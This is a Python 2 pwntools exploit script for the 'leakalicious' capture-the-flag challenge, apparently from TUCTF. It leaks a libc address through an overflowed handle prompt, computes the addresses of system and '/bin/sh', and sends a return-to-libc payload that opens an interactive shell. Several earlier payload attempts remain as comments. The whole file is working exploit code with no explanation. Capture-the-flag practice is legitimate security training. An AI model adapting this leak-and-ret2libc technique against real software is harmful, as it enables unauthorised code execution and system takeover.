#!/usr/bin/env python2

from pwn import *

#context.log_level = 'debug'

p = process('./leakalicious')
#p = remote('chal.tuctf.com', 30505)

gdb.attach(p)

p.sendlineafter('handle?', 'A' * (32 - len('\n')))
#print(p.recvuntil('What... ').split('\n')[2])
address = u32(p.recvuntil('What... ').split('\n')[2].replace('?', '').ljust(4, '\x00')) - 0x00067b40
#offset = [0x13e211, 0x13e212][0]
print(hex(address))

system = address + 0x0003d200
binsh = address + 0x17e0cf
#one = address + 0x13e211
#pop2 = address + 0x00106042
ret = address + 0x000417

print hex(system)

#p.sendline('asdf')
#n = 'C' * 8

#payload = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK'+p32(system)+'aaaa'+p32(binsh)+p32(binsh) 

payload = p32(0)*10+'kkkk'+p32(system)+p32(binsh)+p32(binsh)
#p32(popesi)+p32(libcGot)+p32(popeax)+p32(0x0)+p32(one)
#p32(popedx)+p32(binsh)+p32(system)
 #+ p32(system) + 'aaaa' + p32(binsh)
#payload='asdf'

#print(p.clean())
#print(p.recvuntil('libc am I'))
#p.sendline('hi')
p.sendlineafter('exploit?', payload)

p.interactive()
